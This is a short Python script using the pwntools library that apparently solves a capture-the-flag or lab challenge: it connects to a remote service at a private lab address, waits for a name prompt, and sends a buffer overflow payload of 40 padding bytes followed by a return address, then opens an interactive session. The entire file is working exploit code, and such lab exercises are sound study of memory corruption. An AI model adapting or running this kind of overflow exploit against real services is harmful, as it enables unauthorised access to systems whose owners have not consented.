#!/usr/bin/python3

#pip install pwn if you don't have this module
from pwn import *

#connect to remote ip and port
connect = remote('10.10.183.162', 5700)

#chosen payload to input 
payload  = 'A'*40+'\x86\x06\x40\x00\x00'

#Payload will input when when we recieve "What's your name: " string  
connect.recvuntil("What's your name: ")
connect.sendline(payload)
connect.interactive()

